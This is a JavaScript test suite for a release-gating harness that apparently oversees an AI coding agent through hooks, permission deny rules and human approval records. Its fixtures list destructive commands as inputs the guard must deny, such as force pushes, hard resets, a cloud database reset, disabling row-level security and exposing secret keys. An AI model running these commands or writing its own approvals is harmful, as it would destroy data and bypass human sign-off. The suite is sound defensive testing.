  // Only release/verification/ changed since the recorded commit: still valid.
  const onlyEvidenceMoved = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidence }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git diff --name-only')) {
          return { status: 0, stdout: 'release/verification/B1.evidence.json\n', stderr: '', error: null };
        }
        return gitStub([])(file, args);
      }
    }
  });
  const accepted = onlyEvidenceMoved.execution.result.gates.find(gate => gate.id === 'G5b-acceptance');
  assert.equal(accepted.status, core.STATUS_PASSED);
  assert.equal(onlyEvidenceMoved.execution.exitCode, core.EXIT_HALTED);

  // Product code changed since the recorded commit: stale, and the run stops.
  const codeMoved = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidence }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git diff --name-only')) {
          return { status: 0, stdout: 'release/verification/B1.evidence.json\nsrc/lead-proof.js\n', stderr: '', error: null };
        }
        return gitStub([])(file, args);
      }
    }
  });
  const rejected = codeMoved.execution.result.gates.find(gate => gate.id === 'G5b-acceptance');
  assert.equal(rejected.failureCode, 'ACCEPTANCE_EVIDENCE_STALE');
  assert.equal(codeMoved.execution.exitCode, core.EXIT_BLOCKED);
});

test('documentation and status-only changes do not invalidate acceptance evidence', () => {
  const olderHead = 'c'.repeat(40);
  const evidence = evidenceFor('B1', { headSha: olderHead });
  const docsOnly = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidence }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git diff --name-only')) {
          return {
            status: 0,
            stdout: [
              'docs/project-status.md',
              'docs/release-plan.md',
              'AGENTS.md',
              'CLAUDE.md',
              'README.md',
              'CHANGELOG.md',
              '.claude/settings.json',
              'scripts/release/release-core.cjs',
              'release/backlog.json',
              ''
            ].join('\n'),
            stderr: '', error: null
          };
        }
        return gitStub([])(file, args);
      }
    }
  });
  const gate = docsOnly.execution.result.gates.find(entry => entry.id === 'G5b-acceptance');
  assert.equal(gate.status, core.STATUS_PASSED, gate.summary);
  assert.equal(docsOnly.execution.exitCode, core.EXIT_HALTED);

  // Confirm this is a real allow-list, not an accidental match-everything: one
  // product-relevant path mixed into the same set still goes stale.
  const oneRealChange = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidence }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git diff --name-only')) {
          return { status: 0, stdout: 'docs/project-status.md\nsrc/lead-proof.js\n', stderr: '', error: null };
        }
        return gitStub([])(file, args);
      }
    }
  });
  assert.equal(oneRealChange.execution.result.gates.find(entry => entry.id === 'G5b-acceptance').failureCode, 'ACCEPTANCE_EVIDENCE_STALE');
});

test('isEvidenceDriftAllowed is an allow-list: product paths are not on it', () => {
  for (const path_ of ['docs/project-status.md', 'AGENTS.md', 'CLAUDE.md', 'README.md', 'CHANGELOG.md', '.claude/settings.json', 'scripts/release/release-core.cjs', 'release/backlog.json', 'release/verification/B1.evidence.json', 'release/approvals/B1.approval.json', 'tests/release-harness.test.cjs']) {
    assert.equal(core.isEvidenceDriftAllowed(path_), true, path_);
  }
  for (const path_ of ['src/lead-proof.js', 'supabase/migrations/x.sql', 'index.html', 'package.json', 'tests/lead-proof.test.cjs', 'scripts/lead-proof-smoke.cjs', 'config/data-config.local.js']) {
    assert.equal(core.isEvidenceDriftAllowed(path_), false, path_);
  }
});

test('an uncommitted status-only edit does not dirty the acceptance gate, but an uncommitted product edit does', () => {
  const statusDirty = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git status')) return { status: 0, stdout: ' M docs/project-status.md\n M AGENTS.md\n', stderr: '', error: null };
        return gitStub([])(file, args);
      }
    }
  });
  assert.equal(statusDirty.execution.result.gates.find(entry => entry.id === 'G5b-acceptance').status, core.STATUS_PASSED);

  const productDirty = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git status')) return { status: 0, stdout: ' M docs/project-status.md\n M src/lead-proof.js\n', stderr: '', error: null };
        return gitStub([])(file, args);
      }
    }
  });
  assert.equal(productDirty.execution.result.gates.find(entry => entry.id === 'G5b-acceptance').failureCode, 'ACCEPTANCE_WORKTREE_DIRTY');
});

test('acceptance evidence must name the criterion command and report a detail', () => {
  const task = core.validateBacklog(realBacklog()).tasks.find(entry => entry.id === 'B1');
  const bare = JSON.stringify({
    schemaVersion: 1, taskId: 'B1', headSha: HEAD, recordedAt: '2026-08-05T00:00:00.000Z',
    criteria: task.acceptanceCriteria.map(criterion => ({ id: criterion.id, status: 'passed', exitCode: 0 }))
  });
  const wrongCommand = JSON.stringify({
    schemaVersion: 1, taskId: 'B1', headSha: HEAD, recordedAt: '2026-08-05T00:00:00.000Z',
    criteria: task.acceptanceCriteria.map(criterion => ({ id: criterion.id, status: 'passed', exitCode: 0, command: 'echo ok', detail: 'ok' }))
  });
  for (const payload of [bare, wrongCommand]) {
    const { execution } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: payload }) });
    const gate = execution.result.gates.find(entry => entry.id === 'G5b-acceptance');
    assert.equal(gate.failureCode, 'ACCEPTANCE_CRITERIA_UNPROVEN');
    assert.equal(execution.exitCode, core.EXIT_BLOCKED);
  }
});

test('uncommitted product changes invalidate acceptance evidence', () => {
  // Evidence attests to committed code. An uncommitted edit is code it never
  // saw, and comparing commits alone cannot see it.
  const dirtyStub = (file, args) => {
    const command = [file, ...args].join(' ');
    if (command.startsWith('git status')) {
      return { status: 0, stdout: ' M src/lead-proof.js\n', stderr: '', error: null };
    }
    return gitStub([])(file, args);
  };
  const { execution } = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }),
    deps: { runCommand: dirtyStub }
  });
  const gate = execution.result.gates.find(entry => entry.id === 'G5b-acceptance');
  assert.equal(gate.failureCode, 'ACCEPTANCE_WORKTREE_DIRTY');
  assert.equal(execution.exitCode, core.EXIT_BLOCKED);

  // A modified evidence file is the one exception.
  const evidenceOnly = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }),
    deps: {
      runCommand: (file, args) => {
        const command = [file, ...args].join(' ');
        if (command.startsWith('git status')) return { status: 0, stdout: ' M release/verification/B1.evidence.json\n', stderr: '', error: null };
        return gitStub([])(file, args);
      }
    }
  });
  assert.equal(evidenceOnly.execution.result.gates.find(entry => entry.id === 'G5b-acceptance').status, core.STATUS_PASSED);
});

test('productionActionsExecuted is derived from the ledger, not asserted', () => {
  const { execution } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }) });
  const result = execution.result;
  const expected = result.executedCommands.filter(entry => entry.classification !== core.READ_ONLY).length;
  assert.equal(result.productionActionsExecuted, expected);
  assert.equal(result.productionActionsExecuted, 0);
  assert.ok(result.executedCommands.length > 0, 'the count must be over a non-empty ledger to mean anything');
});

test('a verified task with a valid approval is still not executed by the harness', () => {
  const { execution, recorded } = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1'), [APPROVAL_SUFFIX]: approvalFor('B1') })
  });
  const result = execution.result;
  const gates = new Map(result.gates.map(gate => [gate.id, gate]));
  assert.equal(gates.get('G5b-acceptance').status, core.STATUS_PASSED);
  assert.equal(gates.get('G6-approval').status, core.STATUS_PASSED);
  assert.equal(result.approval.valid, true);
  // Verified, approved, and still halted. The approval authorizes a person.
  assert.equal(execution.exitCode, core.EXIT_HALTED);
  assert.equal(result.failureCode, 'HALTED_AT_PRODUCTION_GATE');
  assert.equal(result.productionActionsExecuted, 0);
  for (const command of recorded) assert.equal(core.isReadOnlyCommand(command), true, command);
});

test('an approval written for a different commit is refused', () => {
  const { execution } = simulate({
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1'), [APPROVAL_SUFFIX]: approvalFor('B1', { headSha: 'b'.repeat(40) }) })
  });
  const gate = execution.result.gates.find(entry => entry.id === 'G6-approval');
  assert.equal(gate.status, core.STATUS_BLOCKED);
  assert.equal(gate.failureCode, 'APPROVAL_HEAD_MISMATCH');
  assert.equal(execution.exitCode, core.EXIT_HALTED);
});

test('an approval for another task, or an incomplete one, is refused rather than repaired', () => {
  const cases = [
    ['APPROVAL_TASK_MISMATCH', approvalFor('B2')],
    ['APPROVAL_INCOMPLETE', JSON.stringify({ schemaVersion: 1, taskId: 'B1', approvedBy: 'x' })],
    ['APPROVAL_MALFORMED', 'not json at all'],
    ['APPROVAL_SCHEMA_UNSUPPORTED', approvalFor('B1', { schemaVersion: 7 })]
  ];
  for (const [code, payload] of cases) {
    const { execution } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1'), [APPROVAL_SUFFIX]: payload }) });
    const gate = execution.result.gates.find(entry => entry.id === 'G6-approval');
    assert.equal(gate.failureCode, code);
    assert.equal(execution.exitCode, core.EXIT_HALTED);
  }
});

test('a missing governance document blocks the run before any gate can pass it', () => {
  const { execution } = simulate({ fs: fsStub({ 'docs/release-gates.md': null }) });
  const result = execution.result;
  assert.equal(execution.exitCode, core.EXIT_BLOCKED);
  assert.equal(result.failureCode, 'GOVERNANCE_DOCUMENT_MISSING');
  const gates = new Map(result.gates.map(gate => [gate.id, gate]));
  assert.equal(gates.get('G2-documents').status, core.STATUS_BLOCKED);
  assert.equal(gates.get('G3-static').status, core.STATUS_BLOCKED);
  // Even a blocked run still reports the production gate as halted and executed.
  assert.equal(gates.get('G7-production').status, core.STATUS_HALTED);
  assert.equal(result.productionActionsExecuted, 0);
});

test('an unusable backlog blocks the run', () => {
  const { execution } = simulate({ fs: fsStub({ 'release/backlog.json': '{ not json' }) });
  assert.equal(execution.exitCode, core.EXIT_BLOCKED);
  assert.equal(execution.result.failureCode, 'BACKLOG_MALFORMED');
  assert.equal(execution.result.productionActionsExecuted, 0);
});

test('verify mode authorizes only read-only delegated commands', () => {
  const execution = core.runRelease({ mode: 'verify' }, {
    repositoryRoot: ROOT,
    runCommand: gitStub([]),
    now: () => new Date('2026-08-05T00:00:00.000Z'),
    fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') })
  });
  const plan = execution.result.executionPlan;
  assert.ok(plan.length > 0);
  for (const entry of plan) {
    assert.equal(entry.classification, core.READ_ONLY, entry.command);
    assert.equal(entry.gate, 'G3-static');
  }
  // G4 writes locally and G5 needs a runtime; neither is ever authorized here.
  assert.equal(plan.some(entry => entry.command.includes('verify:release')), false);
  assert.equal(plan.some(entry => entry.command.includes('verify:runtime')), false);
  assert.equal(execution.exitCode, core.EXIT_HALTED);
});

test('the runtime suites and PowerShell wrappers are classified by what they do', () => {
  assert.equal(core.classifyCommand('node scripts/lead-proof-smoke.cjs').classification, core.LOCAL_WRITE);
  assert.equal(core.classifyCommand('node scripts/agent-management-smoke.cjs').classification, core.LOCAL_WRITE);
  assert.equal(core.classifyCommand('powershell -NoProfile -ExecutionPolicy Bypass -File scripts/check-team-management.ps1').classification, core.READ_ONLY);
  assert.equal(core.classifyCommand('powershell -NoProfile -File scripts/dev/smoke.ps1 -AllowDatabaseReset').classification, core.DESTRUCTIVE);
  assert.equal(core.classifyCommand('powershell -File scripts/Invoke-RuntimeSmokeTest.ps1').classification, core.DESTRUCTIVE);
  assert.equal(core.classifyCommand('node --test tests/lead-proof.test.cjs').classification, core.READ_ONLY);
});

test('security-critical content is refused where it would take effect', () => {
  const rlsOff = 'alter table public.lead_proofs ' + 'disable row level security;';
  const publicBucket = "insert into storage.buckets (id, name, public) values ('lead-proofs', 'lead-proofs', true);";
  const publicUpdate = "update storage.buckets set public = true where id = 'lead-proofs';";
  const serviceKey = 'const client = createClient(url, { serviceRoleKey: "sb_' + 'secret_abcdefghijklmnop" });';

  assert.equal(core.classifySecurityContent('supabase/migrations/x.sql', rlsOff)[0].code, 'RLS_DISABLED');
  assert.equal(core.classifySecurityContent('supabase/migrations/x.sql', publicBucket)[0].code, 'PUBLIC_PROOF_BUCKET');
  assert.equal(core.classifySecurityContent('supabase/migrations/x.sql', publicUpdate)[0].code, 'PUBLIC_PROOF_BUCKET');
  assert.equal(core.classifySecurityContent('inline-command.sql', rlsOff)[0].code, 'RLS_DISABLED');

  // An elevated key is refused in browser-delivered code and tolerated in the
  // Edge Function, where Supabase injects it server-side.
  assert.equal(core.classifySecurityContent('src/data/supabase-data-service.js', serviceKey)[0].code, 'SERVICE_ROLE_KEY_IN_BROWSER_CODE');
  assert.equal(core.classifySecurityContent('index.html', serviceKey)[0].code, 'SERVICE_ROLE_KEY_IN_BROWSER_CODE');
  assert.equal(core.classifySecurityContent('supabase/functions/team-management/index.ts', serviceKey).length, 0);

  // Fixtures and prose quoting the same text change nothing and must not fire.
  assert.deepEqual(core.classifySecurityContent('tests/release-harness.test.cjs', rlsOff), []);
  assert.deepEqual(core.classifySecurityContent('docs/release-gates.md', publicUpdate), []);

  // The migration that is actually shipped must not trip any of these rules.
  const shipped = fs.readFileSync(path.join(ROOT, 'supabase', 'migrations', '20260805000100_lead_proof.sql'), 'utf8');
  assert.deepEqual(core.classifySecurityContent('supabase/migrations/20260805000100_lead_proof.sql', shipped), []);
});

test('the guard refuses every dangerous operation the release policy names', () => {
  const rlsOff = 'alter table public.players ' + 'disable row level security';
  const forbidden = [
    ['force push', bashEvent('git push --force origin feat/x')],
    ['force push with lease', bashEvent('git push --force-with-lease')],
    ['hard reset', bashEvent('git reset --hard origin/main')],
    ['working-tree wipe', bashEvent('git clean -fd')],
    ['cloud database reset', bashEvent('npx supabase db reset --linked')],
    ['production deploy', bashEvent('npx supabase functions deploy team-management')],
    ['production migration push', bashEvent('npx supabase db push')],
    ['link to the existing project', bashEvent('npx supabase link --project-ref hywpwutykwrxkddnofrh')],
    ['link with no target', bashEvent('npx supabase link')],
    ['create a differently named project', bashEvent('npx supabase projects create not-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3')],
    ['create in a different org', bashEvent('npx supabase projects create dashboard-latam-staging --org-id wrong-org --db-password x --region eu-west-3')],
    ['create with a paid plan flag', bashEvent('npx supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3 --plan pro')],
    ['delete a project', bashEvent('npx supabase projects delete abcdefghijklmnopqrst')],
    ['pause a project', bashEvent('npx supabase projects pause abcdefghijklmnopqrst')],
    ['tag and release', bashEvent('git tag -a v1.0.0 -m v1.0.0')],
    ['hosting publish', bashEvent('vercel --prod')],
    ['rls off via sql client', bashEvent(`psql -c "${rlsOff}"`)],
    ['public bucket via sql client', bashEvent('psql -c "update storage.buckets set public = true"')],
    ['rls off via migration edit', { hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: 'supabase/migrations/20260805000100_lead_proof.sql', new_string: rlsOff } }],
    ['public proof bucket via migration edit', { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: 'supabase/migrations/x.sql', content: 'update storage.buckets set public = true;' } }],
    ['service-role key into the browser bundle', { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: 'src/config.js', content: 'export const key = "sb_' + 'secret_abcdefghijklmnop";' } }]
  ];
  for (const [label, event] of forbidden) {
    const outcome = guard.evaluate(event, {});
    assert.equal(outcome.decision, 'deny', `${label} was not denied`);
    assert.ok(outcome.reason.trim().length > 20, `${label} was denied without a usable reason`);
  }
});

test('the gate ladder ends in exactly one production rung', () => {
  const ladder = core.createGateLadder();
  const production = ladder.filter(gate => gate.classification === core.PRODUCTION);
  assert.equal(production.length, 1);
  assert.equal(production[0].id, ladder[ladder.length - 1].id);
  assert.equal(production[0].executor, 'operator');
  for (const gate of ladder.filter(entry => entry.executor === 'orchestrator')) {
    assert.equal(gate.classification, core.READ_ONLY, `${gate.id} is orchestrator-executable but not read-only`);
    for (const command of gate.delegatedCommands) {
      assert.equal(core.isReadOnlyCommand(command), true, command);
    }
  }
});

/* ==================== path classification ==================== */

test('paths are classified for the write guard', () => {
  assert.equal(core.classifyPath('release/approvals/B1.approval.json').kind, 'approval');
  assert.equal(core.classifyPath(path.join(ROOT, 'release', 'approvals', 'x.json')).kind, 'approval');
  assert.equal(core.classifyPath('index.html').kind, 'product-code');
  assert.equal(core.classifyPath('src/data/supabase-data-service.js').kind, 'product-code');
  assert.equal(core.classifyPath('supabase/migrations/0001.sql').kind, 'product-code');
  assert.equal(core.classifyPath('package.json').kind, 'product-code');
  assert.equal(core.classifyPath('.claude/settings.json').kind, 'harness');
  assert.equal(core.classifyPath('scripts/release/release-core.cjs').kind, 'harness');
  assert.equal(core.classifyPath('release/backlog.json').kind, 'harness');
  assert.equal(core.classifyPath('docs/release-plan.md').kind, 'documentation');
  assert.equal(core.classifyPath('../outside.txt').kind, 'outside-repository');
});

/* ==================== the guard hook ==================== */

function bashEvent(command) {
  return { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } };
}

function writeEvent(file) {
  return { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: file, content: 'x' } };
}

test('the guard denies production and destructive commands', () => {
  for (const command of ['git push origin main', 'npx supabase db push', 'gh release create v1', 'npm publish', 'git reset --hard', 'npm run smoke']) {
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
});

test('the guard leaves read-only work alone', () => {
  for (const command of ['npm test', 'git status', 'node scripts/release/release.cjs simulate']) {
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }
});

test('the guard denies every route to an approval record, in every mode', () => {
  const attempts = [
    writeEvent('release/approvals/B1.approval.json'),
    writeEvent(path.join(ROOT, 'release', 'approvals', 'B1.approval.json')),
    { hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: 'release/approvals/B1.approval.json' } },
    bashEvent('echo "{}" > release/approvals/B1.approval.json'),
    bashEvent('cp release/approval.example.json release/approvals/B1.approval.json'),
    bashEvent('rm release/approvals/B1.approval.json')
  ];
  for (const event of attempts) {
    for (const env of [{}, { RELEASE_HARNESS_MODE: 'simulate' }, { RELEASE_HARNESS_MODE: 'verify' }]) {
      assert.equal(guard.evaluate(event, env).decision, 'deny', JSON.stringify(event.tool_input));
    }
  }
});

test('the approval README is documentation, not an approval record', () => {
  // The directory has to be creatable and explainable; only the records inside
  // it carry authority.
  assert.equal(core.classifyPath('release/approvals/README.md').kind, 'documentation');
  assert.equal(core.classifyPath('release/approvals/B1.approval.json').kind, 'approval');
  assert.equal(guard.evaluate(writeEvent('release/approvals/README.md'), {}).decision, 'defer');
  assert.equal(guard.evaluate(bashEvent('git add release/approvals/README.md'), {}).decision, 'defer');
  // Sweeping in the whole directory is still refused.
  assert.equal(guard.evaluate(bashEvent('git add release/approvals/'), {}).decision, 'deny');
  assert.equal(guard.evaluate(writeEvent('release/approvals/B1.approval.json'), {}).decision, 'deny');
});

test('reading an approval is allowed, and code punctuation is not mistaken for a redirect', () => {
  // A guard that denies ordinary reads gets disabled, so the write detection
  // must not fire on `=>`, `->`, or `>=` appearing anywhere in the command.
  assert.equal(guard.evaluate(bashEvent('cat release/approvals/B1.approval.json'), {}).decision, 'defer');
  assert.equal(guard.evaluate(bashEvent('grep "a => b" release/approvals/README.md'), {}).decision, 'defer');
  assert.equal(guard.evaluate(bashEvent('grep "x >= 1" release/approvals/README.md'), {}).decision, 'defer');
  assert.equal(guard.evaluate(bashEvent('cat release/approvals/B1.approval.json > copy.json'), {}).decision, 'deny');
  assert.equal(guard.evaluate(bashEvent('echo {} >> release/approvals/B1.approval.json'), {}).decision, 'deny');
});

test('product code and the harness are protected only while a release run is active', () => {
  const targets = ['index.html', 'src/data/supabase-data-service.js', '.claude/settings.json', 'scripts/release/release-core.cjs'];
  for (const target of targets) {
    assert.equal(guard.evaluate(writeEvent(target), {}).decision, 'defer', target);
    assert.equal(guard.evaluate(writeEvent(target), { RELEASE_HARNESS_MODE: 'simulate' }).decision, 'deny', target);
    assert.equal(guard.evaluate(writeEvent(target), { RELEASE_RUN_ID: 'run-1' }).decision, 'deny', target);
  }
  assert.equal(guard.evaluate(writeEvent('docs/release-plan.md'), { RELEASE_HARNESS_MODE: 'simulate' }).decision, 'defer');
});

test('the guard fails closed on anything it cannot read', () => {
  assert.equal(guard.evaluate(null, {}).decision, 'deny');
  assert.equal(guard.evaluate({ tool_name: 'Bash', tool_input: {} }, {}).decision, 'deny');
  assert.equal(guard.evaluate({ tool_name: 'Bash', tool_input: { command: '   ' } }, {}).decision, 'deny');
  assert.equal(guard.evaluate({ tool_name: 'Write', tool_input: {} }, {}).decision, 'deny');
});

test('the guard denies over stdin, as Claude Code actually invokes it', () => {
  const hookPath = path.join(ROOT, '.claude', 'hooks', 'release-guard.cjs');
  const run = input => spawnSync(process.execPath, [hookPath], { input, encoding: 'utf8', timeout: 20000 });

  const denied = run(JSON.stringify(bashEvent('git push origin main')));
  assert.equal(denied.status, 0);
  const decision = JSON.parse(denied.stdout);
  assert.equal(decision.hookSpecificOutput.hookEventName, 'PreToolUse');
  assert.equal(decision.hookSpecificOutput.permissionDecision, 'deny');
  assert.match(decision.hookSpecificOutput.permissionDecisionReason, /production action/i);

  const allowed = run(JSON.stringify(bashEvent('npm test')));
  assert.equal(allowed.status, 0);
  assert.equal(allowed.stdout.trim(), '');

  const garbage = run('not json');
  assert.equal(garbage.status, 0);
  assert.equal(JSON.parse(garbage.stdout).hookSpecificOutput.permissionDecision, 'deny');
});

/* ==================== the CLI ==================== */

test('the CLI rejects unusable invocations', () => {
  assert.throws(() => cli.parseArgs([]), error => error.code === 'COMMAND_REQUIRED');
  assert.throws(() => cli.parseArgs(['deploy']), error => error.code === 'COMMAND_INVALID');
  assert.throws(() => cli.parseArgs(['simulate', '--force']), error => error.code === 'OPTION_INVALID');
  assert.throws(() => cli.parseArgs(['simulate', '--mode', 'production']), error => error.code === 'MODE_INVALID');
  assert.throws(() => cli.parseArgs(['classify']), error => error.code === 'COMMAND_TEXT_REQUIRED');
  assert.deepEqual(cli.parseArgs(['simulate', '--json']).json, true);
});

test('classify exits 0 only for a read-only command', () => {
  assert.equal(cli.runClassify({ commandLine: 'npm test' }).exitCode, core.EXIT_OK);
  assert.equal(cli.runClassify({ commandLine: 'git push' }).exitCode, core.EXIT_BLOCKED);
  assert.equal(cli.runClassify({ commandLine: 'curl https://example.com' }).exitCode, core.EXIT_BLOCKED);
});

test('the plan subcommand names B1 and every exclusion', () => {
  const plan = cli.runPlan({ backlogPath: null }, { repositoryRoot: ROOT });
  assert.equal(plan.exitCode, core.EXIT_OK);
  assert.equal(plan.payload.selectedTaskId, 'B1');
  assert.ok(plan.human.includes('NEXT TASK: B1'));
  assert.ok(plan.payload.excluded.length >= 5);
});

/* ==================== wiring ==================== */

test('every governance document the ladder requires exists', () => {
  for (const relative of core.REQUIRED_DOCUMENTS) {
    const target = path.join(ROOT, relative.split('/').join(path.sep));
    assert.ok(fs.existsSync(target), `missing ${relative}`);
    assert.ok(fs.readFileSync(target, 'utf8').trim().length > 0, `empty ${relative}`);
  }
});

test('project settings deny the production families and wire both hooks', () => {
  const settings = JSON.parse(fs.readFileSync(path.join(ROOT, '.claude', 'settings.json'), 'utf8'));
  const deny = settings.permissions.deny.join('\n');
  for (const fragment of ['git push', 'git tag', 'gh release', 'npm publish', 'supabase db push', 'supabase functions deploy', 'release/approvals']) {
    assert.ok(deny.includes(fragment), `settings.json does not deny ${fragment}`);
  }
  // The static patterns are a first line of defence, not the authoritative
  // one — classifyGitPush is — but the specific dangerous shapes named in the
  // policy fix must still appear as their own denies, not just as the old
  // blanket "git push:*".
  for (const fragment of [
    'git push origin main', 'git push origin master', 'git push --force',
    'git push --all', 'git push --mirror', 'git push --tags', 'git push --delete',
    'gh pr merge*--admin', 'gh pr merge*--force', 'gh run cancel', 'gh run rerun',
    'hywpwutykwrxkddnofrh', 'supabase projects delete', 'supabase projects pause',
    'supabase projects restore', 'supabase projects transfer',
    'supabase projects create*--plan', 'supabase projects create*--size'
  ]) {
    assert.ok(deny.includes(fragment), `settings.json does not deny ${fragment}`);
  }
  assert.equal(deny.includes('Bash(git push:*)'), false, 'the blanket git-push deny must be replaced by targeted rules, not merely supplemented');
  assert.equal(deny.includes('Bash(supabase link:*)'), false, 'the blanket supabase-link deny must be replaced by a targeted rule, not merely supplemented');
  const allow = settings.permissions.allow.join('\n');
  for (const fragment of [
    'git push origin feat/', 'gh pr create', 'gh pr checks', 'gh pr merge', 'gh run list', 'gh run view',
    'supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob'
  ]) {
    assert.ok(allow.includes(fragment), `settings.json does not allow ${fragment}`);
  }
  const hookCommands = []
    .concat(settings.hooks.SessionStart, settings.hooks.PreToolUse)
    .flatMap(entry => entry.hooks.map(hook => hook.command));
  assert.equal(hookCommands.length, 2);
  for (const command of hookCommands) {
    const relative = command.replace(/^node\s+/, '').trim();
    assert.ok(fs.existsSync(path.join(ROOT, relative.split('/').join(path.sep))), `hook script missing: ${relative}`);
  }
});

test('the agent and skill definitions exist and declare themselves', () => {
  const agents = ['release-planner', 'release-verifier', 'release-gatekeeper', 'release-auditor'];
  for (const name of agents) {
    const content = fs.readFileSync(path.join(ROOT, '.claude', 'agents', `${name}.md`), 'utf8');
    assert.match(content, new RegExp(`^---[\\s\\S]*?\\nname:\\s*${name}\\n`), `${name} frontmatter`);
    assert.match(content, /\ndescription:\s*\S/, `${name} description`);
  }
  for (const name of ['release-run', 'release-production-handoff']) {
    const content = fs.readFileSync(path.join(ROOT, '.claude', 'skills', name, 'SKILL.md'), 'utf8');
    assert.match(content, new RegExp(`\\nname:\\s*${name}\\n`), `${name} frontmatter`);
  }
});

test('the orchestrator contains no production command and re-checks before executing', () => {
  const script = fs.readFileSync(path.join(ROOT, 'scripts', 'release', 'Invoke-ReleaseOrchestrator.ps1'), 'utf8');
  const executionSites = script.match(/Invoke-CheckedCommand|Invoke-ReleaseCli|Start-Process|&\s+node/g) || [];
  assert.ok(executionSites.length > 0);
  assert.ok(script.includes('Test-ReadOnlyCommand'), 'the orchestrator must re-classify before executing');
  for (const forbidden of ['git push', 'git tag', 'gh release', 'npm publish', 'db push', 'functions deploy']) {
    assert.equal(script.includes(forbidden), false, `orchestrator references ${forbidden}`);
  }
});
